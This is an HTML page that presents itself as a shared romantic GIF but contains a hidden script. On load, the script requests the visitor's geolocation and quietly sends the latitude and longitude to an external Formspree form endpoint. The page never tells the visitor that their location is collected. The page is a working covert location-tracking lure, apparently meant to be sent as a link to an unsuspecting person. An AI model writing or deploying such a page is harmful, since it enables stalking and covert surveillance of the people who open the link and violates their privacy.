<!DOCTYPE html>
<html>
<body onload="getLocation()">

<iframe src="https://giphy.com/embed/BUfpfjQwtrMXDKVSF6" width="320" height="480" style="" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p><a href="https://giphy.com/gifs/ZhotShop-love-amor-couple-BUfpfjQwtrMXDKVSF6">via GIPHY</a></p>

<p id="demo"></p>

<script>
const x = document.getElementById("demo");

function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition);
  } else { 
    x.innerHTML = "Geolocation is not supported by this browser.";
  }
}

function showPosition(position) {
    const formData = new FormData();
    formData.append("lat", position.coords.latitude);
    formData.append("long", position.coords.longitude);
    formData.append("_subject", "Geolocation Data");

    fetch("https://formspree.io/f/xnnpakgj", {
        method: "POST",
        body: formData,
        headers: { "Accept": "application/json" }
    }).then(response => {
        if (response.ok) {
            console.log("Coordinates sent successfully.");
        } else {
            console.log("Error sending coordinates.");
        }
    }).catch(error => console.error("Fetch error:", error));
}
</script>

</body>
</html>
